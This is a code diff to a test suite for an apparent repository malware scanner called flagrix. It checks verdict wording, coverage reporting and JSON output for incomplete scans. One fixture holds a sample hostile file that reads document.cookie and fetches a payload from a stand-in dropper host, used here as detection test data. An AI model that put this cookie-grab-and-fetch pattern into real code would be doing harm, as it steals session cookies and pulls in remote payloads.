@@ -8,9 +8,12 @@ import { tmpdir } from "node:os"
 import { join } from "node:path"
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest"
 
+import { scanGitHubRepo } from "@flagrix/scanner-core"
 import type { GitHubScanResult } from "@flagrix/scanner-core"
 
 import { runScan } from "../src/commands/scan.js"
+import { parseRepoTarget } from "../src/lib/github-url.js"
+import { loadSignatures } from "../src/lib/signatures.js"
 import { repoScanResponse } from "../src/commands/mcp.js"
 import { coverageOf } from "../src/lib/coverage.js"
 import { EXIT, exitCodeForScan } from "../src/commands/shared.js"
@@ -275,11 +278,24 @@ describe("incomplete coverage", () => {
     const out = logs.join("\n")
     expect(out).toContain("SCAN INCOMPLETE — no verdict")
     expect(out).not.toContain("LOW RISK")
-    expect(out).not.toContain("Safe to clone")
+    expect(out).not.toContain("No blocking findings")
+    expect(out).not.toMatch(/\bsafe\b/i)
+    expect(out).toContain("not enough of this repository was read to give a verdict")
     expect(out).not.toContain("security score")
     expect(out).toContain("GitHub rate limit")
     // The note is soft-wrapped, so assert on a fragment that stays on one line.
     expect(out).toContain("Nothing was found in what was read")
+  })
+
+  it("human output for a complete low names what was found, never 'safe'", async () => {
+    global.fetch = mockApi(CLEAN) as unknown as typeof fetch
+    await runScan("acme/clean", { json: false })
+
+    const out = logs.join("\n")
+    expect(out).toContain("LOW RISK — No blocking findings")
+    expect(out).toContain("security score")
+    // A scanner reduces risk; it can't certify a repository. No "safe" wording.
+    expect(out).not.toMatch(/\bsafe\b/i)
   })
 
   it("human output keeps a high verdict but says there may be more", async () => {
@@ -308,6 +324,8 @@ describe("incomplete coverage", () => {
     expect(summary!.text).toContain("INCOMPLETE SCAN — no verdict")
     expect(summary!.text).not.toContain("LOW risk")
     expect(summary!.text).toContain("Do NOT clone")
+    expect(summary!.text).toContain("only part of this repository was read")
+    expect(summary!.text).not.toMatch(/\bsafe\b/i)
     expect(summary!.text).toContain("GitHub rate limit")
     // An agent should be able to branch on coverage without parsing prose.
     expect(JSON.parse(json!.text).scanSummary.complete).toBe(false)
@@ -321,6 +339,111 @@ describe("incomplete coverage", () => {
     expect(summary.text).toContain("LOW risk — security score")
     expect(summary.text).toContain("no blocking findings")
     expect(summary.text).not.toContain("INCOMPLETE")
+  })
+})
+
+/**
+ * `--json` is what agents, hooks and scripts read, so it must say what the
+ * exit code says: a low over partial coverage is not a clear. The engine's
+ * own fields stay (riskLevel included) so consumers don't break; `verdict`,
+ * `coverage` and a coverage-aware `safeToClone` carry the CLI's decision.
+ */
+describe("JSON verdict and coverage", () => {
+  const CLEAN = {
+    "src/a.js": "export const a = 1\n",
+    "src/b.js": "export const b = 2\n",
+    "src/c.js": "export const c = 3\n"
+  }
+  // Same medium recipe as the exit-2 test above, read first so a budget of
+  // one file still finds it.
+  const MEDIUM_PARTIAL = {
+    "src/enc.js": `const c = document.cookie\nfetch("https://dropper.xyz/payload")\n`,
+    "src/b.js": "export const b = 2\n",
+    "src/c.js": "export const c = 3\n"
+  }
+
+  it("complete low → exit 0, verdict low, safeToClone true", async () => {
+    global.fetch = mockApi(CLEAN) as unknown as typeof fetch
+    expect(await runScan("acme/clean", { json: true })).toBe(EXIT.LOW)
+
+    const report = JSON.parse(logs.join("\n"))
+    expect(report.verdict).toBe("low")
+    expect(report.riskLevel).toBe("low")
+    expect(report.safeToClone).toBe(true)
+    expect(report.coverage).toEqual({
+      complete: true,
+      unreliableClear: false,
+      filesRead: 3,
+      filesUnread: 0
+    })
+  })
+
+  it("incomplete low → exit 4, verdict incomplete, safeToClone false", async () => {
+    global.fetch = mockApi(CLEAN, { contentLimit: 1 }) as unknown as typeof fetch
+    expect(await runScan("acme/partial", { json: true })).toBe(EXIT.INCOMPLETE)
+
+    const report = JSON.parse(logs.join("\n"))
+    expect(report.verdict).toBe("incomplete")
+    expect(report.safeToClone).toBe(false)
+    expect(report.coverage).toEqual({
+      complete: false,
+      unreliableClear: true,
+      filesRead: 1,
+      filesUnread: 2,
+      reason: "rate-limit"
+    })
+    // Kept for compatibility: the engine's reading of the one file it saw.
+    expect(report.riskLevel).toBe("low")
+    expect(report.scanSummary.complete).toBe(false)
+  })
+
+  it("incomplete low from fetch errors → verdict incomplete, reason fetch-errors", async () => {
+    global.fetch = mockApi(CLEAN, { failPaths: ["src/c.js"] }) as unknown as typeof fetch
+    expect(await runScan("acme/flaky", { json: true })).toBe(EXIT.INCOMPLETE)
+
+    const report = JSON.parse(logs.join("\n"))
+    expect(report.verdict).toBe("incomplete")
+    expect(report.safeToClone).toBe(false)
+    expect(report.coverage).toMatchObject({ complete: false, unreliableClear: true, reason: "fetch-errors" })
+  })
+
+  it("incomplete medium → exit 2, verdict medium — findings stand, coverage still reported", async () => {
+    global.fetch = mockApi(MEDIUM_PARTIAL, { contentLimit: 1 }) as unknown as typeof fetch
+    expect(await runScan("acme/meh-partial", { json: true })).toBe(EXIT.MEDIUM)
+
+    const report = JSON.parse(logs.join("\n"))
+    expect(report.verdict).toBe("medium")
+    expect(report.riskLevel).toBe("medium")
+    expect(report.safeToClone).toBe(false)
+    expect(report.coverage).toEqual({
+      complete: false,
+      unreliableClear: false,
+      filesRead: 1,
+      filesUnread: 2,
+      reason: "rate-limit"
+    })
+  })
+
+  it("the MCP tool's JSON block matches `flagrix scan --json`", async () => {
+    // The MCP handler gets the raw engine result straight from scanner-core,
+    // so feed it one — not the CLI's already-corrected JSON.
+    global.fetch = mockApi(CLEAN, { contentLimit: 1 }) as unknown as typeof fetch
+    const raw = await scanGitHubRepo(parseRepoTarget("acme/partial"), {
+      signatures: (await loadSignatures()).signatures
+    })
+    expect(raw.safeToClone).toBe(true) // the engine alone would pass it
+
+    const block = JSON.parse(repoScanResponse(raw).content[1]!.text)
+    expect(block.verdict).toBe("incomplete")
+    expect(block.safeToClone).toBe(false)
+    expect(block.coverage).toMatchObject({ complete: false, unreliableClear: true, reason: "rate-limit" })
+
+    global.fetch = mockApi(CLEAN, { contentLimit: 1 }) as unknown as typeof fetch
+    await runScan("acme/partial", { json: true })
+    const cli = JSON.parse(logs.join("\n"))
+    expect(block.verdict).toBe(cli.verdict)
+    expect(block.safeToClone).toBe(cli.safeToClone)
+    expect(block.coverage).toEqual(cli.coverage)
   })
 })
 
